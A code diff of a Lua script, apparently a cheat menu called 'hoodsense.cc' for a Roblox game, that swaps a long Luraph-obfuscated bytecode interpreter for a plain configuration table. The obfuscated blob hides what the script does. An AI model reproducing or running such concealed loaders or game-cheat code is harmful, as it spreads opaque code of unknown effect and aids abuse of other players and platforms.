@@ -1,3 +1,2264 @@
--- This file was generated using Luraph Obfuscator v13.4.5
+local Config = {
+    WindowName = "hoodsense.cc",
+	Color = Color3.fromRGB(22, 88, 232),
+	Keybind = Enum.KeyCode.V
+}
 
-return(function(ph,nh,hh,xh,Eh,qh,Wh,Qh,gh,fh,rh,Ph,jh,oh,ty,Vh,vh,Yh,Oy,wh,uh,Kh,Ah,yy,Jh,Rh,sy,wy,Uh,Mh,Ch,Hh,Oh,Th,Sh,ly,Gh,Dh,Xh,Bh,kh,Zh,eh,yh,ah,xy,Ih,zh,dh,bh,mh,ch,Nh,Ly,Fh,Py,Ky,ky,ih,...)local Z,th,n,a,A,p,B,b,Q,D=kh,0,Oh,Oh,Oh,Oh,Oh,Oh,Oh,(Oh);local K=(Ph[xh]);local P,x,y=Ph[yh],Ph[Kh],Ph[fh];local h=dh[hh];local E,u,C=Eh,uh,Ch;local O=Sh;local S,X=Xh,Wh;local W,m=Ph[mh],Zh;local w=(nh);local l=(ah);local f,d=Ph[Ah],(ph);local s,t,k=Bh,bh,Qh;do while th<10 do if th<=4 then if th<=1 then do if th~=0 then b=Dh;do th=4;end;else n=Z();do th=2;end;continue;end;end;else if not(th<=2)then if th~=3 then th=5;else th=6;continue;end;else th=9;continue;end;end;else if not(th<=6)then if not(th<=7)then if th~=8 then do a={};end;do th=7;end;continue;else do D=function()local E2,L2=1,Oh;repeat if not(E2<=0)then if E2~=1 then return L2;else do L2=x(b,A,A);end;E2=0;continue;end;else A=A+1;E2=2;end;until(Fh);end;end;th=10;end;else A=1;th=3;do continue;end;end;else if th==5 then b=f(P(b,5),Rh,function(fP)if x(fP,2)~=72 then local PU=y(s(fP,16));do if not(Q)then return PU;else local vs=(Oh);local Ws=2;repeat if not(Ws<=0)then if Ws~=1 then vs=K(PU,Q);Ws=0;do continue;end;else return vs;end;else Q=Oh;Ws=1;do continue;end;end;until(Fh);end;end;else do Q=s(P(fP,1,1));end;return Yh;end;end);th=8;do continue;end;else th=1;continue;end;end;end;end;end;local R=(function()local P4,d4=Oh,(Oh);local E4=(1);while(Nh)do if not(E4<=0)then do if E4~=1 then do return P4;end;else P4,d4=W(ch,b,A);E4=0;continue;end;end;else do A=d4;end;E4=2;end;end;end);local Y=(2147483648);th=0;local F,N=Oh,(Oh);while th<2 do if th==0 then F=4294967296;do th=1;end;else N=2^52;do th=2;end;continue;end;end;local c=(F-1);th=3;local e,I,q,J,r=Oh,Oh,Oh,Oh,(Oh);do while th<6 do if not(th<=2)then do if not(th<=3)then do if th~=4 then J=function()local vm,Hm=Oh,Oh;local Bm=0;do while(Nh)do if not(Bm<=0)then if Bm==1 then A=Hm;Bm=2;do continue;end;else return vm;end;else vm,Hm=W(Jh,b,A);Bm=1;end;end;end;end;th=0;continue;else do I=function(V3,I3,h3)local x3,D3=1,Oh;while(Nh)do if not(x3<=0)then if x3~=1 then D3=D3-D3%1;x3=0;continue;else D3=(V3/e[h3])%e[I3];x3=2;end;else return D3;end;end;end;end;th=2;end;end;else e={[0]=1};do th=1;end;end;end;else if th<=0 then do r=eh[Ih];end;th=6;else do if th~=1 then q=function()local Z2,r2=Oh,(Oh);for Bi=0,2 do do if not(Bi<=0)then if Bi~=1 then return Z2;else do A=r2;end;continue;end;else Z2,r2=W(qh,b,A);continue;end;end;end;end;th=5;continue;else do local Hc=(2);for ec=1,31 do local Fc=1;while Fc~=2 do if Fc==0 then Hc=Hc*2;Fc=2;do continue;end;else e[ec]=Hc;do Fc=0;end;continue;end;end;end;end;th=4;end;end;end;end;end;end;local i,v=eh[rh],eh[ih];local j=eh[vh];local z,M=zh,Mh;th=0;local g,H=Oh,(Oh);repeat if th~=0 then do H=function(FM)local EM=(R());local dM=(2);local VM=Oh;do repeat if not(dM<=1)then do if dM~=2 then return VM;else do VM=Yh;end;dM=0;end;end;else if dM==0 then do for J0=1,EM,7997 do local I0,d0,B0=2,Oh,Oh;while(Nh)do if I0<=1 then do if I0~=0 then for Yf=1,#B0 do local mf=0;repeat if mf~=0 then p=(FM*p+209)%256;mf=2;do continue;end;else do(B0)[Yf]=r(B0[Yf],p);end;mf=1;continue;end;until mf==2;end;do I0=0;end;do continue;end;else do VM=VM..y(X(B0));end;break;end;end;else if not(I0<=2)then do if I0~=3 then do if not(d0>EM)then else d0=EM;end;end;I0=3;else do B0={x(b,A+J0-1,A+d0-1)};end;do I0=1;end;continue;end;end;else d0=J0+7997-1;I0=4;end;end;end;end;end;do dM=1;end;continue;else do A=A+EM;end;do dM=3;end;end;end;until(Fh);end;end;end;do break;end;else do g=function(vU)local CU={x(b,A,A+3)};local wU=0;local GU,VU,jU,aU=Oh,Oh,Oh,(Oh);do while(Nh)do if not(wU<=2)then if not(wU<=4)then if wU==5 then do return aU*16777216+jU*65536+VU*256+GU;end;else do aU=r(CU[4],B);end;do wU=2;end;end;else if wU~=3 then VU=r(CU[2],B);do wU=3;end;continue;else do jU=r(CU[3],B);end;wU=6;end;end;else if wU<=0 then GU=r(CU[1],B);wU=4;else do if wU~=1 then B=(193*B+vU)%256;wU=1;else A=A+4;wU=5;continue;end;end;end;end;end;end;end;end;th=1;continue;end;until(Fh);th=1;local T,V,U,G,o,lh=Oh,Oh,Oh,Oh,Oh,Oh;repeat if not(th<=4)then do if not(th<=6)then if not(th<=7)then if th==8 then do T={};end;th=5;else function lh(ol,fl,el)local Ol,ml,gl,Ul=ol[7],ol[2],ol[3],(ol[9]);local hl=ol[5];local ql=(ol[4]);local ul,rl=ol[6],(ol[1]);local Pl=(E({},{__mode=gh}));local tl=(Oh);tl=function(...)local gm,Cm,xm=0,1,{};local hm=(Z());local Um=(hm==n and el or hm);local Nm,Dm=V(...);do Nm=Nm-1;end;for et=0,Nm do do if ml>et then xm[et]=Dm[et+1];else break;end;end;end;do o[2]=ol;end;(o)[3]=xm;if not ul then do Dm=Oh;end;elseif rl then(xm)[ml]={[Hh]=Nm>=ml and Nm-ml+1 or 0,X(Dm,ml+1,Nm+1)};end;do if Um==hm then else m(tl,Um);end;end;local vm,um,dm,Lm=t(function()while true do local Yr=(ql[Cm]);local Or=Yr[1];Cm=Cm+1;if not(Or<77)then do if not(Or<115)then do if not(Or>=134)then do if not(Or<124)then if not(Or<129)then if not(Or>=131)then if Or~=130 then(xm)[Yr[3]]=xm[Yr[10]]*xm[Yr[5]];else local AZ=(Oh);local NZ=(Ol[Yr[4]]);local KZ=(NZ[8]);if not(KZ>0)then else AZ={};for Qo=0,KZ-1 do local vo=(ql[Cm]);local Wo=vo[1];if Wo~=57 then(AZ)[Qo]=fl[vo[10]];else do AZ[Qo]={xm,vo[10]};end;end;Cm=Cm+1;end;h(Pl,AZ);end;do xm[Yr[3]]=lh(NZ,AZ,Um);end;end;else do if not(Or>=132)then if not(not(xm[Yr[10]]<xm[Yr[5]]))then else Cm=Cm+1;end;else do if Or~=133 then xm[Yr[3]]=Yr[7]+xm[Yr[5]];else(xm)[Yr[3]]=Yr[7]~=Yr[9];end;end;end;end;end;else do if not(Or<126)then do if not(Or<127)then if Or==128 then(xm)[Yr[3]]=o[Yr[10]];else if not(not(Yr[7]<=xm[Yr[5]]))then else Cm=Cm+1;end;end;else xm[Yr[3]]=Oh;end;end;else if Or~=125 then do xm[Yr[3]]=z(xm[Yr[10]]);end;else repeat local Lk,ak=Pl,xm;if not(#Lk>0)then else local wu=({});do for RI,cI in S,Lk do for Vb,ob in S,cI do if not(ob[1]==ak and ob[2]>=0)then else local Z7=ob[2];if not(not wu[Z7])then else do(wu)[Z7]={ak[Z7]};end;end;(ob)[1]=wu[Z7];do(ob)[2]=1;end;end;end;end;end;end;until Nh;return Fh,Yr[3],gm;end;end;end;end;else if not(Or>=119)then if not(Or<117)then do if Or~=118 then local yA=Yr[3];local YA,mA=xm[Yr[10]],xm[Yr[5]];(xm)[yA+1]=YA;xm[yA]=YA[mA];else do xm[Yr[3]]=Yr[7]<Yr[9];end;end;end;else if Or~=116 then xm[Yr[3]]=Yr[7]+Yr[9];else local z6=(xm[Yr[10]]/xm[Yr[5]]);(xm)[Yr[3]]=z6-z6%1;end;end;else do if not(Or<121)then if Or<122 then local L3=(Yr[10]);local Z3=(xm[L3]);for IO=L3+1,Yr[5]do Z3=Z3..xm[IO];end;xm[Yr[3]]=Z3;else if Or~=123 then do xm[Yr[3]]=Nh;end;Cm=Cm+1;else if Yr[5]==201 then Cm=Cm-1;(ql)[Cm]={[1]=126,[3]=(Yr[3]-217)%256,[10]=(Yr[10]-217)%256};else do xm[Yr[3]]=#xm[Yr[10]];end;end;end;end;else do if Or~=120 then xm[Yr[3]]={X({},1,Yr[10])};else if xm[Yr[10]]~=Yr[9]then else Cm=Cm+1;end;end;end;end;end;end;end;end;else if not(Or>=144)then if Or<139 then if not(Or>=136)then if Or==135 then Cm=Yr[4];else do if Yr[10]==85 then do Cm=Cm-1;end;ql[Cm]={[1]=123,[3]=(Yr[3]-42)%256,[10]=(Yr[5]-42)%256};else if not(not xm[Yr[3]])then else Cm=Cm+1;end;end;end;end;else if Or>=137 then do if Or==138 then local fu=Yr[3];do xm[fu]=xm[fu](xm[fu+1]);end;gm=fu;else local NH,oH=Yr[3],(Yr[10]);gm=NH+oH-1;repeat local hI,eI=Pl,xm;if not(#hI>0)then else local HI={};do for iv,Av in S,hI do for Mu,ou in S,Av do if ou[1]==eI and ou[2]>=0 then local Jd=ou[2];if not(not HI[Jd])then else(HI)[Jd]={eI[Jd]};end;do ou[1]=HI[Jd];end;ou[2]=1;end;end;end;end;end;until Nh;return Nh,NH,oH;end;end;else(xm)[Yr[3]]=M(xm[Yr[10]],Yr[9]);end;end;else if not(Or>=141)then if Or==140 then if Yr[7]==Yr[9]then else Cm=Cm+1;end;else xm[Yr[3]]=Yr[7]-xm[Yr[5]];end;else if not(Or>=142)then xm[Yr[3]]=Yr[6];else do if Or==143 then gm=Yr[3];xm[gm]=xm[gm]();else do o[Yr[10]]=xm[Yr[3]];end;end;end;end;end;end;else if not(Or<149)then do if not(Or>=151)then if Or==150 then(xm[Yr[3]])[Yr[7]]=xm[Yr[5]];else xm[Yr[3]]=xm[Yr[10]]>xm[Yr[5]];end;else if not(Or<ky)then do if Or~=153 then if xm[Yr[10]]<=Yr[9]then Cm=Cm+1;end;else xm[Yr[3]]=Yr[7]/xm[Yr[5]];end;end;else(xm)[Yr[3]]=Yr[7]>xm[Yr[5]];end;end;end;else if Or>=146 then if not(Or>=ty)then(xm)[Yr[3]]=xm[Yr[10]]==Yr[9];else do if Or==148 then(xm)[Yr[3]]=xm[Yr[10]]%xm[Yr[5]];else xm[Yr[3]]=xm[Yr[10]]~=xm[Yr[5]];end;end;end;else if Or==145 then if not(xm[Yr[10]]<Yr[9])then else Cm=Cm+1;end;else(xm)[Yr[3]]=r(Yr[7],Yr[9]);end;end;end;end;end;end;else if not(Or<96)then if not(Or<105)then if not(Or<110)then if not(Or<112)then do if not(Or>=113)then local Vo=((Yr[5]-1)*50);local Fo=Yr[3];do for Fa=1,Yr[10]do xm[Fo][Vo+Fa]=xm[Fo+Fa];end;end;else do if Or~=114 then local DY=xm[Yr[10]]/Yr[9];(xm)[Yr[3]]=DY-DY%1;else do xm[Yr[3]]=i(xm[Yr[10]],xm[Yr[5]]);end;end;end;end;end;else do if Or~=111 then local ys=Yr[3];local Ns=(xm[Yr[10]]);xm[ys+1]=Ns;xm[ys]=Ns[Yr[9]];else do xm[Yr[3]]=i(Yr[7],Yr[9]);end;end;end;end;else if not(Or>=107)then if Or~=106 then do if Yr[5]~=165 then local Br,Mr=Yr[3],Nm-ml;if not(Mr<0)then else Mr=-1;end;for Ig=Br,Br+Mr do xm[Ig]=Dm[ml+(Ig-Br)+1];end;gm=Br+Mr;else do Cm=Cm-1;end;(ql)[Cm]={[1]=85,[3]=(Yr[3]-18)%256,[5]=(Yr[10]-18)%256};end;end;else local w6=Yr[3];do xm[w6]=xm[w6](xm[w6+1],xm[w6+2]);end;do gm=w6;end;end;else if not(Or<108)then if Or==109 then local zU=(xm[Yr[10]]);if not(not zU)then do xm[Yr[3]]=zU;end;else Cm=Cm+1;end;else if not(not(Yr[7]<xm[Yr[5]]))then else Cm=Cm+1;end;end;else(xm)[Yr[3]]=xm[Yr[10]]==xm[Yr[5]];end;end;end;else if not(Or>=100)then if not(Or<98)then if Or==99 then local sQ=(Yr[3]);(xm[sQ])(xm[sQ+1],xm[sQ+2]);gm=sQ-1;else if not(not(Yr[7]<Yr[9]))then else Cm=Cm+1;end;end;else if Or==97 then local ee=Yr[7]/xm[Yr[5]];(xm)[Yr[3]]=ee-ee%1;else(xm)[Yr[3]]=-xm[Yr[10]];end;end;else do if not(Or>=102)then if Or~=101 then if not(not(xm[Yr[10]]<=Yr[9]))then else Cm=Cm+1;end;else if Yr[5]~=94 then xm[Yr[3]]=not xm[Yr[10]];else Cm=Cm-1;ql[Cm]={[5]=(Yr[10]-74)%Gh,[3]=(Yr[3]-74)%256,[1]=17};end;end;else if not(Or<103)then do if Or==104 then xm[Yr[3]]=Yr[7]>=Yr[9];else xm[Yr[3]]=Yr[7]^xm[Yr[5]];end;end;else xm[Yr[3]]=j(Yr[7],xm[Yr[5]]);end;end;end;end;end;else if not(Or>=86)then if not(Or>=81)then if not(Or>=79)then if Or~=78 then if not(Yr[7]<xm[Yr[5]])then else Cm=Cm+1;end;else xm[Yr[3]][xm[Yr[10]]]=xm[Yr[5]];end;else if Or==80 then do xm[Yr[3]]=M(Yr[7],Yr[9]);end;else(xm)[Yr[3]]=Yr[7]/Yr[9];end;end;else if not(Or<83)then if not(Or>=84)then xm[Yr[3]]=Yr[7]%xm[Yr[5]];else if Or==85 then if Yr[10]~=16 then if not(xm[Yr[3]])then else do Cm=Cm+1;end;end;else Cm=Cm-1;ql[Cm]={[3]=(Yr[3]-160)%256,[1]=15,[10]=(Yr[5]-160)%256};end;else do gm=Yr[3];end;(xm[gm])();gm=gm-1;end;end;else if Or~=82 then(xm)[Yr[3]]=Yr[6];else xm[Yr[3]]=xm[Yr[10]]+Yr[9];end;end;end;else do if not(Or>=91)then if not(Or<88)then if not(Or<89)then if Or==90 then(xm)[Yr[3]]=v(xm[Yr[10]],Yr[9]);else xm[Yr[3]]=xm[Yr[10]]>=xm[Yr[5]];end;else if Yr[5]==35 then Cm=Cm-1;ql[Cm]={[10]=(Yr[10]-86)%256,[1]=15,[3]=(Yr[3]-86)%256};elseif Yr[5]==206 then do Cm=Cm-1;end;(ql)[Cm]={[10]=(Yr[10]-84)%Gh,[3]=(Yr[3]-84)%256,[1]=126};elseif Yr[5]~=125 then for C4=Yr[3],Yr[10]do xm[C4]=Oh;end;else do Cm=Cm-1;end;ql[Cm]={[10]=(Yr[10]-189)%256,[3]=(Yr[3]-189)%256,[1]=101};end;end;else if Or==87 then do(xm)[Yr[3]]=i(xm[Yr[10]],Yr[9]);end;else xm[Yr[3]]=xm[Yr[10]]<xm[Yr[5]];end;end;else do if not(Or>=93)then do if Or~=92 then xm[Yr[3]]=r(Yr[7],xm[Yr[5]]);else xm[Yr[3]][xm[Yr[10]]]=Yr[9];end;end;else do if not(Or<94)then if Or~=95 then do repeat local oA,LA=Pl,(xm);if#oA>0 then local A6=({});for pU,QU in S,oA do do for ZE,UE in S,QU do do if not(UE[1]==LA and UE[2]>=0)then else local vH=(UE[2]);do if not A6[vH]then do(A6)[vH]={LA[vH]};end;end;end;UE[1]=A6[vH];(UE)[2]=1;end;end;end;end;end;end;until Nh;end;return Nh,Yr[3],1;else xm[Yr[3]]=xm[Yr[10]]<Yr[9];end;else local KJ=(xm[Yr[10]]);xm[Yr[3]]=KJ..KJ;end;end;end;end;end;end;end;end;end;end;else if not(Or>=38)then if not(Or<19)then if not(Or>=28)then do if not(Or>=23)then if not(Or>=21)then if Or==20 then local Ft=(Yr[7]/Yr[9]);do xm[Yr[3]]=Ft-Ft%1;end;else local f2=(Yr[3]);local l2=(f2+2);local u2=(f2+1);xm[f2]=l(s(xm[f2]),ly);(xm)[u2]=l(s(xm[u2]),Ly);xm[l2]=l(s(xm[l2]),sy);xm[f2]=xm[f2]-xm[l2];Cm=Yr[4];end;else do if Or==22 then(xm)[Yr[3]]=Yr[7]-Yr[9];else do(xm)[Yr[3]]=xm[Yr[10]]%Yr[9];end;end;end;end;else if not(Or<25)then if not(Or>=26)then xm[Yr[3]]=xm[Yr[10]]^Yr[9];else if Or~=27 then local Xk=(Yr[3]);gm=Xk+Yr[10]-1;do(xm)[Xk]=xm[Xk](X(xm,Xk+1,gm));end;gm=Xk;else local PM=(Yr[3]);for QQ=PM,PM+(Yr[10]-1)do(xm)[QQ]=Dm[ml+(QQ-PM)+1];end;end;end;else if Or==24 then(xm)[Yr[3]]=xm[Yr[10]]/Yr[9];else xm[Yr[3]]=Um[Yr[6]];end;end;end;end;else do if not(Or<33)then if not(Or>=35)then if Or==34 then(xm)[Yr[3]]=Yr[7]>Yr[9];else do xm[Yr[3]]=Yr[7]==xm[Yr[5]];end;end;else if not(Or>=36)then xm[Yr[3]]=v(Yr[7],Yr[9]);else do if Or~=37 then xm[Yr[3]]=j(xm[Yr[10]],Yr[9]);else xm[Yr[3]]=Yr[7]~=xm[Yr[5]];end;end;end;end;else if not(Or>=30)then if Or==29 then xm[Yr[3]]=Yr[7]==Yr[9];else(xm)[Yr[3]]=xm[Yr[10]]>=Yr[9];end;else if not(Or<31)then if Or~=32 then xm[Yr[3]]=Yr[7]<xm[Yr[5]];else local pG=Yr[3];(xm[pG])(X(xm,pG+1,gm));gm=pG-1;end;else(xm)[Yr[3]]=Nh;end;end;end;end;end;else do if Or<9 then if not(Or>=4)then if Or>=2 then if Or~=3 then xm[Yr[3]]=xm[Yr[10]]*Yr[9];else(xm)[Yr[3]]=xm[Yr[10]]<=Yr[9];end;else if Or~=1 then do xm[Yr[3]]=Yr[7]%Yr[9];end;else(xm)[Yr[3]]=r(xm[Yr[10]],Yr[9]);end;end;else if not(Or>=6)then if Or==5 then local Ks=Yr[3];(xm)[Ks]=xm[Ks](X(xm,Ks+1,gm));gm=Ks;else do xm[Yr[3]]=r(xm[Yr[10]],xm[Yr[5]]);end;end;else do if not(Or<7)then if Or~=8 then(xm)[Yr[3]]=Yr[6];else(Um)[Yr[6]]=xm[Yr[3]];end;else(xm)[Yr[3]]=v(xm[Yr[10]],xm[Yr[5]]);end;end;end;end;else if not(Or>=14)then if not(Or>=11)then if Or==10 then(xm)[Yr[3]]=xm[Yr[10]][xm[Yr[5]]];else local nV=fl[Yr[10]];do xm[Yr[3]]=nV[1][nV[2]];end;end;else if Or>=12 then if Or==13 then(xm)[Yr[3]]=xm[Yr[10]]~=Yr[9];else(xm)[Yr[3]]=j(xm[Yr[10]],xm[Yr[5]]);end;else(xm)[Yr[3]]=xm[Yr[10]]-xm[Yr[5]];end;end;else if not(Or>=16)then if Or==15 then do repeat local Z_,Q_=Pl,xm;if not(#Z_>0)then else local ic={};do for ha,Ia in S,Z_ do for Qd,Sd in S,Ia do if not(Sd[1]==Q_ and Sd[2]>=0)then else local H9=(Sd[2]);if not(not ic[H9])then else ic[H9]={Q_[H9]};end;Sd[1]=ic[H9];Sd[2]=1;end;end;end;end;end;until Nh;end;local nd=(Yr[3]);return Fh,nd,nd+Yr[10]-2;else do xm[Yr[3]]=xm[Yr[10]]/xm[Yr[5]];end;end;else if not(Or>=17)then local fT=(Yr[10]);do(xm)[Yr[3]]=xm[fT]..xm[fT+1];end;else if Or~=18 then if Yr[10]~=167 then local Lb=(Yr[3]);local ob,mb=Lb+2,(Lb+3);local qb=({xm[Lb](xm[Lb+1],xm[ob])});do for ER=1,Yr[5]do(xm)[ob+ER]=qb[ER];end;end;local Tb=(xm[mb]);if Tb==Oh then Cm=Cm+1;else(xm)[ob]=Tb;end;else Cm=Cm-1;(ql)[Cm]={[1]=126,[10]=(Yr[5]-215)%256,[3]=(Yr[3]-oh)%256};end;else do(xm)[Yr[3]]=i(Yr[7],xm[Yr[5]]);end;end;end;end;end;end;end;end;else do if not(Or<57)then do if not(Or>=67)then if not(Or>=62)then if not(Or>=59)then do if Or==58 then do if not(not(xm[Yr[10]]<=xm[Yr[5]]))then else do Cm=Cm+1;end;end;end;else if Yr[5]==11 then Cm=Cm-1;(ql)[Cm]={[3]=(Yr[3]-174)%256,[1]=Uh,[10]=(Yr[10]-174)%Gh};elseif Yr[5]~=119 then(xm)[Yr[3]]=xm[Yr[10]];else Cm=Cm-1;do(ql)[Cm]={[3]=(Yr[3]-9)%256,[5]=(Yr[10]-9)%256,[1]=17};end;end;end;end;else if not(Or<60)then if Or~=61 then xm[Yr[3]]=Yr[7]*Yr[9];else local l_=(Yr[3]);local O_=(Yr[5]-1)*50;do for gN=1,gm-l_ do(xm[l_])[O_+gN]=xm[l_+gN];end;end;end;else xm[Yr[3]]=M(Yr[7],xm[Yr[5]]);end;end;else if not(Or<64)then if not(Or>=65)then if Yr[5]==22 then do Cm=Cm-1;end;ql[Cm]={[1]=71,[10]=(Yr[10]-Vh)%256,[3]=(Yr[3]-223)%256};else do repeat local NK,AK,PK=Pl,xm,(Yr[3]);do if not(#NK>0)then else local LM={};for uV,CV in S,NK do do for oj,Aj in S,CV do do if not(Aj[1]==AK and Aj[2]>=PK)then else local i3=Aj[2];do if not(not LM[i3])then else do LM[i3]={AK[i3]};end;end;end;(Aj)[1]=LM[i3];do Aj[2]=1;end;end;end;end;end;end;end;end;until Nh;end;end;else do if Or~=66 then xm[Yr[3]]=xm[Yr[10]]-Yr[9];else xm[Yr[3]]=Yr[7]<=xm[Yr[5]];end;end;end;else if Or~=63 then xm[Yr[3]]=xm[Yr[10]]>Yr[9];else(xm)[Yr[3]]=xm[Yr[10]][Yr[9]];end;end;end;else if not(Or>=72)then do if Or<69 then if Or==68 then if not(xm[Yr[10]]<xm[Yr[5]])then else Cm=Cm+1;end;else(xm)[Yr[3]]={};end;else do if not(Or>=70)then xm[Yr[3]]=Yr[7]*xm[Yr[5]];else if Or~=71 then if Yr[5]==113 then Cm=Cm-1;ql[Cm]={[3]=(Yr[3]-86)%256,[1]=74,[10]=(Yr[10]-86)%256};elseif Yr[5]==180 then do Cm=Cm-1;end;(ql)[Cm]={[3]=(Yr[3]-42)%256,[1]=85,[5]=(Yr[10]-42)%256};elseif Yr[5]==25 then Cm=Cm-1;ql[Cm]={[1]=17,[3]=(Yr[3]-Th)%256,[5]=(Yr[10]-130)%256};elseif Yr[5]==205 then Cm=Cm-1;do ql[Cm]={[3]=(Yr[3]-86)%256,[10]=(Yr[10]-86)%256,[1]=27};end;elseif Yr[5]==26 then do Cm=Cm-1;end;ql[Cm]={[1]=85,[5]=(Yr[10]-234)%256,[3]=(Yr[3]-234)%256};else xm[Yr[3]]=Dm[ml+1];end;else if Yr[5]==15 then Cm=Cm-1;(ql)[Cm]={[1]=125,[10]=(Yr[10]-153)%256,[3]=(Yr[3]-153)%256};elseif Yr[5]~=152 then repeat local ze,Me=Pl,xm;if not(#ze>0)then else local zG=({});for rP,cP in S,ze do for jJ,pJ in S,cP do if not(pJ[1]==Me and pJ[2]>=0)then else local NX=pJ[2];if not zG[NX]then(zG)[NX]={Me[NX]};end;do pJ[1]=zG[NX];end;pJ[2]=1;end;end;end;end;until Nh;return;else do Cm=Cm-1;end;(ql)[Cm]={[3]=(Yr[3]-18)%256,[10]=(Yr[10]-18)%256,[1]=105};end;end;end;end;end;end;else if not(Or<74)then if not(Or<75)then if Or==76 then(xm)[Yr[3]]=v(Yr[7],xm[Yr[5]]);else repeat local pQ,kQ=Pl,(xm);if not(#pQ>0)then else local mV={};for o8,B8 in S,pQ do for ZT,yT in S,B8 do do if not(yT[1]==kQ and yT[2]>=0)then else local iS=(yT[2]);if not(not mV[iS])then else mV[iS]={kQ[iS]};end;yT[1]=mV[iS];yT[2]=1;end;end;end;end;end;until Nh;return Nh,Yr[3],0;end;else if Yr[5]~=172 then do repeat local fR,GR=Pl,(xm);if not(#fR>0)then else local Qf=({});for nf,Pf in S,fR do do for xD,wD in S,Pf do if wD[1]==GR and wD[2]>=0 then local Bd=(wD[2]);if not(not Qf[Bd])then else(Qf)[Bd]={GR[Bd]};end;do wD[1]=Qf[Bd];end;wD[2]=1;end;end;end;end;end;until Nh;end;local gk=Yr[3];do return Fh,gk,gk;end;else Cm=Cm-1;ql[Cm]={[1]=125,[10]=(Yr[10]-236)%256,[3]=(Yr[3]-236)%256};end;end;else if Or==73 then do if xm[Yr[10]]==xm[Yr[5]]then else Cm=Cm+1;end;end;else local qZ=Yr[3];gm=qZ+Yr[10]-1;(xm[qZ])(X(xm,qZ+1,gm));gm=qZ-1;end;end;end;end;end;else if not(Or>=47)then if not(Or>=42)then if not(Or<40)then do if Or==41 then(xm)[Yr[3]]=xm[Yr[10]]^xm[Yr[5]];else do xm[Yr[3]]=xm[Yr[10]]<=xm[Yr[5]];end;end;end;else if Or==39 then do(xm)[Yr[3]]=xm[Yr[10]]+xm[Yr[5]];end;else local tR=(fl[Yr[10]]);tR[1][tR[2]]=xm[Yr[3]];end;end;else do if Or<44 then if Or~=43 then if xm[Yr[10]]~=Yr[9]then do Cm=Cm+1;end;end;else do(xm)[Yr[3]]=Yr[7]<=Yr[9];end;end;else if not(Or>=45)then if Yr[7]==xm[Yr[5]]then else Cm=Cm+1;end;else if Or~=46 then if not(not(Yr[7]<=Yr[9]))then else do Cm=Cm+1;end;end;else(xm)[Yr[3]]=Fh;end;end;end;end;end;else do if not(Or>=52)then if not(Or>=49)then do if Or~=48 then xm[Yr[3]]=Yr[7]>=xm[Yr[5]];else do(xm)[Yr[3]]=Yr[7]^Yr[9];end;end;end;else if Or<50 then local qK,lK,OK=Yr[3],Yr[10],(Yr[5]);if lK==0 then else gm=qK+lK-1;end;local QK,RK=Oh,Oh;if lK==1 then QK,RK=V(xm[qK]());else QK,RK=V(xm[qK](X(xm,qK+1,gm)));end;do if OK==1 then gm=qK-1;else if OK==0 then QK=QK+qK-1;gm=QK;else QK=qK+OK-2;gm=QK+1;end;local xz=0;for Ad=qK,QK do xz=xz+1;xm[Ad]=RK[xz];end;end;end;else if Or==51 then(xm[Yr[3]])[Yr[7]]=Yr[9];else(xm)[Yr[3]]=M(xm[Yr[10]],xm[Yr[5]]);end;end;end;else if not(Or>=54)then if Or~=53 then do if xm[Yr[10]]~=xm[Yr[5]]then else do Cm=Cm+1;end;end;end;else local hK=Yr[3];(xm[hK])(xm[hK+1]);gm=hK-1;end;else if not(Or<55)then if Or~=56 then do(xm)[Yr[3]]=j(Yr[7],Yr[9]);end;else if not(xm[Yr[10]]<Yr[9])then do Cm=Cm+1;end;end;end;else local Rf=Yr[3];local Mf=xm[Rf+2];local vf=xm[Rf]+Mf;(xm)[Rf]=vf;if not(Mf>0)then do if not(vf>=xm[Rf+1])then else Cm=Yr[4];do(xm)[Rf+3]=vf;end;end;end;else do if not(vf<=xm[Rf+1])then else Cm=Yr[4];(xm)[Rf+3]=vf;end;end;end;end;end;end;end;end;end;end;end;end;end;end);if not(vm)then if k(um)~=Oy then w(um,0);else if d(um,wy)then return Py();end;do if not(d(um,"^.-:%d+: "))then(w)(um,0);else(w)("Luraph Script:"..(Ul[Cm-1]or"(internal)")..": "..O(um),0);end;end;end;else if um then do if Lm==1 then return xm[dm]();else return xm[dm](X(xm,dm+1,gm));end;end;elseif not(dm)then else return X(xm,dm,Lm);end;end;end;m(tl,el);return tl;end;th=10;end;else U={};th=0;end;else if th==5 then for fb=1,D()do local bb=({});for gM=0,1 do if gM==0 then T[fb-1]=bb;do continue;end;else do for OZ=1,D()do local MZ=(D());local eZ=(OZ-1)*2;do bb[eZ]=I(MZ,4,0);end;(bb)[eZ+1]=I(MZ,4,4);end;end;continue;end;end;end;th=3;continue;else do o={};end;th=4;end;end;end;else if not(th<=1)then if not(th<=2)then if th~=3 then th=9;else do V=function(...)return wh(jh,...),{...};end;end;do th=7;end;do continue;end;end;else B=D();th=8;end;else if th~=0 then do p=D();end;do th=2;end;continue;else do G=1;end;th=6;end;end;end;until th==10;local function Lh()local GD,cD,XD,OD,UD,hD=1,Oh,Oh,Oh,Oh,(Oh);while(Nh)do do if not(GD<=3)then do if not(GD<=5)then if not(GD<=6)then if GD~=7 then hD=R()-133759;break;else cD[16]=D();GD=3;end;else XD={};do GD=2;end;continue;end;else do if GD~=4 then do cD[3]=D();end;do GD=8;end;continue;else do UD=1;end;GD=7;end;end;end;end;else if GD<=1 then if GD~=0 then GD=0;continue;else cD={Oh,Oh,Oh,{},Oh,Oh,{},Oh,{}};do GD=6;end;end;else if GD~=2 then(cD)[16]=R();GD=5;continue;else OD={};GD=4;end;end;end;end;end;do GD=1;end;local ID,nD=Oh,Oh;while GD~=4 do if not(GD<=1)then if GD~=2 then do for Zb=1,nD do local pb,Qb,Lb,Gb=2,Oh,Oh,Oh;while pb<3 do if not(pb<=0)then do if pb~=1 then Qb=R();pb=0;continue;else Gb=R();pb=3;do continue;end;end;end;else Lb=R();pb=1;continue;end;end;for gi=Qb,Lb do do(cD[9])[gi]=Gb;end;end;end;end;GD=4;do continue;end;else nD=R();GD=3;end;else if GD~=0 then ID=D();GD=0;continue;else for kV=1,hD do local fV,uV,lV=0,Oh,Oh;do while fV<=1 do do if fV~=0 then lV=g(ID);fV=2;continue;else uV={Oh,Oh,Oh,Oh,Oh,Oh,Oh,Oh,Oh,Oh};fV=1;continue;end;end;end;end;fV=4;while fV<=7 do if fV<=3 then do if not(fV<=1)then if fV~=2 then(uV)[15]=I(lV,16,9);do fV=8;end;else(uV)[5]=I(lV,9,23);do fV=7;end;continue;end;else if fV==0 then uV[3]=I(lV,8,6);do fV=6;end;else(uV)[10]=I(lV,9,14);fV=5;end;end;end;else if not(fV<=5)then if fV~=6 